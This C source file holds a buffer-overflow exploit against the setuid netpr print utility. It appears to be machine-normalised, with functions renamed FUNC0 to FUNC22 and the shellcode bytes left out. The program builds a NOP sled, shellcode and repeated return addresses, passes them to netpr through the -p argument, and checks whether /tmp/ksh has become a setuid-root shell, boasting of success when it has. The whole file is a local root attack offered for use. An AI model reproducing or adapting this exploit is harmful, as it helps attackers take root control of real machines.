#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct stat {scalar_t__ st_uid; int st_mode; } ;

/* Variables and functions */
 int BUFLEN ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  O_RDWR ; 
 int STDERR_FILENO ; 
 int STDIN_FILENO ; 
 int STDOUT_FILENO ; 
 int FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (int) ; 
 int /*<<< orphan*/ * buf ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (int,int) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,char*,char*,char*,char*,char*,int /*<<< orphan*/ *,char*,char*,char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int FUNC8 () ; 
 unsigned long FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,unsigned long) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int) ; 
 int FUNC12 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC13 (int*) ; 
 int /*<<< orphan*/  FUNC14 (char*,...) ; 
 int /*<<< orphan*/  FUNC15 (int,char*,int) ; 
 int /*<<< orphan*/  shell ; 
 scalar_t__ FUNC16 (char*,struct stat*) ; 
 unsigned long FUNC17 (int /*<<< orphan*/ ) ; 
 long FUNC18 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 unsigned long FUNC19 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC20 (int*) ; 
 int FUNC21 (int,char*,int) ; 

int
FUNC22(int argc, char *argv[])
{
    unsigned long int esp, nop;                                           
    long int offset = 0;                         
    char *hostname, c;                           
    int i, null, umbilical[2];                   
    struct stat st;
    int status;                                                           

    if (argc < 2) {                                                       
        FUNC14("usage: %s hostname [offset]\n", argv[0]);                 
        FUNC7(1);
    }

    esp = FUNC9();
    hostname = argv[1];
    if (argc > 2)
        offset = FUNC18(argv[2], NULL, 0);       
    if (argc > 3)
        nop = FUNC19(argv[3], NULL, 0);
    else
        nop = 942;
 
    FUNC11(buf, NOP, BUFLEN);                                             
    FUNC10(buf+nop, shell, FUNC17(shell));       
    for (i = nop+FUNC17(shell); i <= BUFLEN-4; i += 4)
        *((int *) &buf[i]) = esp+offset;         
    
    FUNC14("using return address 0x%08x (0x%08x offset %d) [nop %d]\n",   
           esp+offset, esp, offset, nop);
    
    if (FUNC16("/tmp/ksh", &st) < 0) {
        FUNC14("exploit failed; copy /bin/ksh to /tmp first!\n");
        FUNC7(1);
    }
    
    if (FUNC13(umbilical) < 0) {
        FUNC14("exploit failed; unable to create a pipe!\n");
        FUNC7(1); 
    }
        
    switch (FUNC8()) {
    case -1:
        FUNC14("exploit failed; unable to fork!\n");
        FUNC7(1);
        break;
    case 0:
        if ((null = FUNC12("/dev/null", O_RDWR, 0)) < 0) {
            FUNC14("exploit failed; cannot open /dev/null!\n");
            FUNC7(1);
        }  
        FUNC5(null, STDIN_FILENO);
        FUNC5(null, STDOUT_FILENO);  
        FUNC5(null, STDERR_FILENO);
        if (null > STDERR_FILENO)
            FUNC4(null);
        FUNC4(umbilical[0]);
        FUNC5(umbilical[1], 10); /* yes, descriptor 10 -- trust me ;-) */
        FUNC6("/usr/lib/lp/bin/netpr", 
              "netpr",
              "-I", "ADM-ADM",
              "-U", "ADM!ADM",
              "-p", buf,
              "-d", hostname,
              "-P", "bsd",
              "/etc/passwd", NULL);
        FUNC14("exploit failed; unable to exec!\n");
        FUNC7(1);
        break;
    default:
        FUNC4(umbilical[1]);
        c = 0;
        while (c != '\n') {
            FUNC15(umbilical[0], &c, 1);
        }
        c = '\0';
        while (FUNC21(umbilical[0], &c, 1) < 1)
            ;
        FUNC20(&status);
        if (FUNC2(status)) {
            FUNC14("exploit failed; child process died on signal %d "
                   "(try adjusting the offset)\n", FUNC3(status));
            FUNC7(1);
        } else if (FUNC1(status) && (FUNC0(status) != 0)) {
            FUNC14("exploit failed; child process exited with unexpected "
                   "return value %d, instead of 0\n", FUNC0(status));
            FUNC7(1);
        }
        break;  
    }   
    
    if (FUNC16("/tmp/ksh", &st) < 0) {
        FUNC14("exploit failed; /tmp/ksh disappeared somehow!\n");
        FUNC7(1); 
    } else if (st.st_uid != 0) {
        FUNC14("exploit failed; failed to make /tmp/ksh owned by root!\n");
        FUNC7(1); 
    } else if ((st.st_mode & 07777) != 04555) {
        FUNC14("exploit failed; failed to change /tmp/ksh to mode 4555!\n");
        FUNC7(1);
    } else {
        FUNC14("exploit successful; /tmp/ksh is now SUID root, dewd!\n");
        FUNC7(0);   
    }       
}